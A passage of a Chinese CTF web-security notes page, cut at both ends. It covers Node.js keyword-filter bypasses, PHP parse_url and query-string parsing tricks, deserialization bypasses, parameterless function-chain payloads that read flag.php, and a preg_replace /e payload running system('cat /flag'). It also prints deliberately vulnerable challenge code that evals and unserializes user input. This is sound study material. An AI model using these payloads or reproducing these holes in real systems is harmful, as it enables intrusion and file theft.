class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> unicode_encode($str[$i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main(<span class="string">'test'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h2 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h2><p>可以利用字符串拼接和数组调用（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但注意到单双引号和加号同时被过滤了，我们想要直接输入字符串拼接的话似乎也行不通了。这里我们可以利用反引号来把文本括起来作为字符串 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings</a> ，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串。 </p><p>比如这里 prototype 被过滤了，我们可以这样书写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure><p>这样就可以拼接出一个 prototype 字符串,最后payload</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(call_user_func, <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>));</span><br></pre></td></tr></table></figure><p>call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。</p><p>这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发 <code>__call</code> 方法，造成ssrf去访问flag.php。</p><h3 id="parse-url解析漏洞"><a href="#parse-url解析漏洞" class="headerlink" title="parse_url解析漏洞"></a>parse_url解析漏洞</h3><p>此函数返回一个关联数组，包含现有 URL 的各种组成部分。如果缺少了其中的某一个，则不会为这个组成部分创建数组项。组成部分为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scheme – 如 http</span><br><span class="line">host       域名</span><br><span class="line">port        端口</span><br><span class="line">pass　　</span><br><span class="line">path　　 路径</span><br><span class="line">query – 在问号 ? 之后</span><br><span class="line">fragment – 在散列符号 <span class="comment"># 之后</span></span><br></pre></td></tr></table></figure><p>此函数并 不 意味着给定的 URL 是合法的，它只是将上方列表中的各部分分开。parse_url() 可接受不完整的 URL，并尽量将其解析正确。<br>注: 此函数对相对路径的 URL 不起作用。</p><p>利用点一：     </p><p>匹配最后一个@后面符合格式的host      </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://www.baidu.com@blog.cfyqy.com/file.php?v=1&amp;k=2#id"</span>; </span><br><span class="line"><span class="keyword">echo</span> $url.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$parts = parse_url($url);  </span><br><span class="line">var_dump($parts);</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com@blog.cfyqy.com/file.php?v=1&amp;k=2<span class="comment">#id&lt;/br&gt;array(6) &#123;</span></span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(4) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(14) <span class="string">"blog.cfyqy.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(13) <span class="string">"www.baidu.com"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(9) <span class="string">"/file.php"</span></span><br><span class="line">  [<span class="string">"query"</span>]=&gt;</span><br><span class="line">  string(7) <span class="string">"v=1&amp;k=2"</span></span><br><span class="line">  [<span class="string">"fragment"</span>]=&gt;</span><br><span class="line">  string(2) <span class="string">"id"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用点二：     </p><p>如果path部分为///，则解析错误，为false ,例如可绕过如下部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter_directory();</span><br></pre></td></tr></table></figure><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><p>PHP的字符串解析特性:<br>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）</p><p>num参数的值如果为字母就会显示页面请求就会错误。可以猜测这里的waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（主要是waf不是用php写的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333a</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a>  </p><h2 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型绕过op，php://filter读取文件，<br>is_valid()两种绕过方式<br>(1). p神在小密圈内曾经发过一个点就是在反序列化时，将s改为S，此时后面的字符串支持16进制表示，因此我们的0x00就可以改写为\00，因为在is_valid中是将我们序列化后的字符串逐个转为ascii然后进行对比，而因此\00会被解析为三个字符，且都在允许的范围内，因此可以成功绕过。<br>(2). 这道题因为出题人的php版本较高，前面的绕过还可以用php7.2+的黑魔法，public属性直接反序列化就能用了。</p><h2 id="无参数执行"><a href="#无参数执行" class="headerlink" title="无参数执行"></a>无参数执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])</span><br></pre></td></tr></table></figure><p>(和)表示转义括号<br>(?R)?表示引用当前表达式</p><p>大致意思就是可以使用函数，但是函数中不能有参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><p>查看有哪些文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>打印flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即Array([0]&#x3D;&gt;index.php[1]&#x3D;&gt;flag.php&#x3D;&gt;[2].git[3]&#x3D;&gt;..[4]&#x3D;&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><h2 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>paydload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p>详情可看此文章：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>知识点  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base32</span><br><span class="line">url编码绕过</span><br><span class="line">preg_match在非&#x2F;s模式下的绕过</span><br><span class="line">$_POST和$_GET的优先级</span><br><span class="line">PHP伪协议。</span><br><span class="line">sha1函数的数组绕过。</span><br><span class="line">create_function()的代码注入</span><br></pre></td></tr></table></figure><p>页面源码  找到一个base32的字符串，解码得1nD3x.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span 